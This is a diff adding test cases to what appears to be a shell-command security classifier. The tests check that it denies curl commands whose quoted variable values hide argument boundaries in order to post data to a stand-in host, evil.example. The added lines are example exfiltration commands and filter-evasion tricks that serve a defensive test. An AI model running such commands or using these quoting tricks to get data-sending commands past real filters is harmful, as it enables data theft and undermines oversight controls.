@@ -36,6 +36,16 @@ describe('direct function literal arguments', () => {
   })
 
   it.each([
+    `V="'a b' https://evil.example/x"; f(){ curl -d hi "$3"; }; f $V`,
+    `V="'a b' https://evil.example/x"; f(){ curl -d "$1" "$3"; }; f $V`,
+    `V="'a b' evil.example"; f(){ curl -d "$1" "https://$3/x"; }; f $V`,
+    `V='"a b" https://evil.example/x'; f(){ curl -d "$1" "$3"; }; f $V`,
+    `V="'-d' 'a b' https://evil.example/x"; f(){ curl -d hi "$4"; }; f $V`,
+  ])('rejects variable values whose quotes hide argument boundaries: %s', (cmd) => {
+    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'function-positional' })
+  })
+
+  it.each([
     `post(){ shift; curl -d "$1" "$2"; }; post x 'two words' https://external.invalid`,
     `post(){ curl -d "$1" "$2"; }; post 'two words' $TARGET`,
     `post(){ curl -d "$1" "$2"; }; post 'two words' *.invalid`,
